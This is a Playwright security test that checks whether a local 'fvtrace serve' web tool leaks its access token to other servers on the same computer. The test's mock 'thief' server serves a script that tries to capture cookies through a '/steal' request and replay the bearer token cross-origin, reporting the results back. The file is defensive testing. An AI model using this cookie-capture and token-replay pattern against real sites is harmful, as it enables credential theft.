// No other server on this computer learns the run's token (security review F2). Cookies ignore
// ports, so a cookie would reach every server on the host that the browser visits; the token lives
// in the page origin's storage instead (an origin includes the port). A page from another origin
// that holds the token still cannot read the claims: its `Authorization` header needs a preflight,
// which fvtrace serve refuses (OPTIONS → 405, no CORS header).
import http from "node:http";
import { test, expect } from "@playwright/test";
import { serveFvtrace } from "./fvtrace-server.js";

test("another server on this computer learns no credential", async ({ page }) => {
  const web = await serveFvtrace();
  const token = new URLSearchParams(new URL(web.url).hash.slice(1)).get("token") ?? "";
  /** @type {Record<string, string>} */
  const seen = {};
  // The other server: its page asks its own origin (a same-site request, so any cookie for this
  // host would ride along), then tries the claims with the real token from its own origin.
  const thief = http.createServer((req, res) => {
    const url = new URL(req.url ?? "/", "http://thief.invalid");
    if (url.pathname === "/") {
      res.setHeader("content-type", "text/html");
      res.end(`<script type="module">
        const report = (k, v) => fetch("/report?" + new URLSearchParams({ [k]: v }));
        await fetch("/steal");
        try {
          const r = await fetch(${JSON.stringify(`${web.base}/api/evaluation`)}, {
            headers: { Authorization: ${JSON.stringify(`Bearer ${token}`)} },
          });
          await report("crossOrigin", String(r.status));
        } catch {
          await report("crossOrigin", "refused");
        }
        await report("done", "yes");
      </script>`);
      return;
    }
    if (url.pathname === "/steal") seen["cookie"] = req.headers.cookie ?? "";
    for (const [k, v] of url.searchParams) seen[k] = v;
    res.end("ok");
  });
  await new Promise((resolve) => thief.listen(0, "127.0.0.1", () => resolve(undefined)));
  const address = thief.address();
  const thiefPort = typeof address === "object" && address ? address.port : 0;
  try {
    await page.goto(web.url);
    await page.locator("article.circuit").first().waitFor();
    expect(await page.context().cookies()).toEqual([]);
    expect(await page.evaluate(() => fetch("/api/evaluation").then((r) => r.status))).toBe(403);
    await page.goto(`http://127.0.0.1:${thiefPort}/`);
    // The other page needs three requests; a loaded host stretches them past expect's 5 s.
    await expect.poll(() => seen["done"], { timeout: 60_000 }).toBe("yes");
    expect(seen["cookie"]).toBe("");
    expect(seen["crossOrigin"]).toBe("refused");
  } finally {
    thief.close();
    await web.close();
  }
});
